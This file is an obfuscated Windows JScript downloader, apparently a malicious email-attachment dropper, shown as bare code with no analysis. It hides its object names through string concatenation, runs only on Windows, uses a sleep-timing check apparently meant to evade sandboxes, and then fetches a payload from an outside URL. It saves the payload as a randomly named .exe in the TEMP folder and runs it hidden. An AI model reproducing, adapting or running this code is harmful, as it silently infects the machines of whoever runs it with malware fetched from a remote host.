var Q0 = false;
var H = "Create"+"Object";
var I = function RC() {return WScript[H]("WScript"+".Shell");}(), MS = 11;
var RL = "MSXML2"+".XMLHTTP";
var N = 2;
var V2 = N - 2;
function O(J0){I["Run"](J0, V2, V2);};
function P(){return RL + "";};
function V1(G, ZP){V2 = V2 * 1; return G - ZP;};
function TX(){return H;};
/*@cc_on
  @if (@_win32 || @_win64)
    Q0 = true;
  @end
@*/
if (Q0)
{
var IF = "";
function X(){return 22;};
var N0 = 0; var TE = 0;
function V0()
{
var T = new this["Date"]();
var L = T["getUTCMilliseconds"]();
WScript["Sleep"](X());
var T = new this["Date"]();
var MV = T["getUTCMilliseconds"]();
WScript["Sleep"](X());
var T = new this["Date"]();
var OH = T["getUTCMilliseconds"]();
var N0 = "S0";
N0 = V1(MV, L);
var TE = "Z";
TE = V1(OH, MV);
IF = "open";
return V1(N0, TE);
}
var EN = false;
var C = false;
for (var F = V2; F < X() * 1; F++){if (V0() != V2){
EN = true; 
TE = "31" + 11 * N0 + TE; 
C = true; 
break;
}}
function V() {return ((EN == true) && (EN == C)) ? 1 : V2;};
if (EN && V() && C){
function S() {return I["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "bw1eLYwoE3z3.ex" + "e";};
 E = P();
 A = WScript[H](E);
 var LH = 1;
do { 
	for (;LH;){
	try {
		if (LH == 1)
		{
			A[IF]("GET", "http://ekotrade.pl/m4ujda", false);
			A["send"]();
			CJ = "Sleep";
			LH = 2;
		}
		WScript[CJ](X() + 120); 
		if (A["readystate"] < 2 * 2) continue;
		LH = V2;
		function RO(MU) {var J = (1, 2, 3, 4, 5, MU); return J;};
		A0 = WScript[TX()]("ADODB.Stream");
		E = A0;
		E[IF]();
		E["type"] = RO(1);
		E["write"](A["ResponseBody"]);
		A0["position"] = RO(V2);
		E["Save" + "ToFile"](S(), 2);
		A0["cl"+"ose"]();
		TA = S();
		O(TA);
	} catch(Q){};};
}while (LH);
}
}

